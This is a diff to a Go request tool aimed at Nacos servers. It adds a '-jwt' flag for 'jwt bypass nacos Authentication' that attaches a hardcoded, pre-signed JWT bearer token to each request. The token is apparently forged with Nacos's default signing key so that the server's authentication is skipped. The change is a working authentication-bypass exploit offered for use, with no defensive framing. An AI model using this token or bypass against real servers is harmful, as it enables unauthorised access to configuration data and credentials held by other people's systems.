@@ -65,6 +65,7 @@ var (
 func main() {
 	urlPtr := flag.String("u", "", "URL to request https://example.com/nacos/")
 	tokenPtr := flag.String("token", "", "accessToken for request")
+	jwtPtr := flag.Bool("jwt", false, "jwt bypass nacos Authentication")
 	flag.Parse()
 	if *urlPtr == "" {
 		fmt.Println(os.Args[0] + " -u https://example.com/nacos/")
@@ -83,6 +84,9 @@ func main() {
 	}
 	if *tokenPtr != "" {
 		req1.Header.Set("accessToken", *tokenPtr)
+	}
+	if *jwtPtr {
+		req1.Header.Set("Authorization", "Bearer eyJhbGciOiJIUzI1NiJ9.eyJzdWIiOiJuYWNvcyIsImV4cCI6MTYxODEyMzY5N30.nyooAL4OMdiByXocu8kL1ooXd1IeKj6wQZwIH8nmcNA")
 	}
 
 	resp1, err := client.Do(req1)
